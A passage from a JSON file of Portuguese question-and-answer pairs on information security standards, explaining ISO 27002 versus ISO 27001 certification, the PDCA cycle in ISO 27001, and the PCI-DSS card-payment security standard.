    "pergunta": "Comente a seguinte expressão: \"A empresa onde trabalho é certificada ISO 27002.\"",
    "resposta": "A afirmação está incorreta, pois a ISO 27002 não é uma norma certificável. ISO 27002 é um código de prática com recomendações para gestão de segurança da informação. A certificação é obtida através da ISO 27001, que especifica os requisitos para estabelecer, implementar, manter e melhorar continuamente um Sistema de Gestão de Segurança da Informação (SGSI)."
  },
  {
    "pergunta": "O que significa o ciclo PDCA no âmbito da ISO 27001?",
    "resposta": "O ciclo PDCA (Plan-Do-Check-Act) é um modelo de melhoria contínua utilizado na ISO 27001 para gerenciar e aprimorar sistematicamente a segurança da informação. \n1. Plan (Planejar): Estabelecer o SGSI, identificando objetivos, políticas e procedimentos. \n2. Do (Executar): Implementar e operar o SGSI conforme o planejado. \n3. Check (Verificar): Monitorar e revisar o desempenho do SGSI contra os objetivos estabelecidos. \n4. Act (Agir): Manter e melhorar continuamente o SGSI com base nos resultados obtidos."
  },
  {
    "pergunta": "Descreva o que entende por PCI-DSS.",
    "resposta": "PCI-DSS (Payment Card Industry Data Security Standard) é um conjunto de padrões de segurança criado por empresas de cartões de crédito (American Express, Discover Financial Services, JCB, MasterCard Worldwide e Visa International) para proteger as transações de cartões de crédito contra fraudes. Ele aplica-se a todas as entidades que armazenam, processam ou transmitem dados de cartões de pagamento e inclui requisitos para proteger dados, manter uma rede segura e monitorar e testar redes."
  }
]
```
